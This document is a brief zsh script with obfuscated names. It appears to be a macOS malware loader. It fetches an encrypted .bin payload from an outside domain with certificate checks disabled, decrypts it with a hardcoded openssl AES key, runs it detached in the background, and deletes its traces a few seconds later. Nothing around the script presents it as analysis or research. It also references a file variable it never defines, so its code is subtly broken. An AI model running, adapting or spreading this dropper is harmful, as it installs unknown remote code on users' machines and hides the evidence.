#!/bin/zsh
ck7n2=$(mktemp /tmp/g2nqaf.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mecde5ca94442f927.bin" -o "$ck7n2z" || exit 1
yn2n86=$(stat -f %z "$ck7n2z"); z2adkez=$(( yn2n86 - 1554 - 140 ))
tail -c +$(( 1554 + 1 )) "$ck7n2z" | head -c $z2adkez | openssl enc -d -aes-256-cbc -k c1c147257fb0fd3c2c88f564 -out "$ck7n2" 2>/dev/null
[ -s "$ck7n2" ] && chmod 700 "$ck7n2" && ( "$ck7n2" & ) && disown
( sleep 3; rm -f "$ck7n2" "$ck7n2z" ) &>/dev/null &
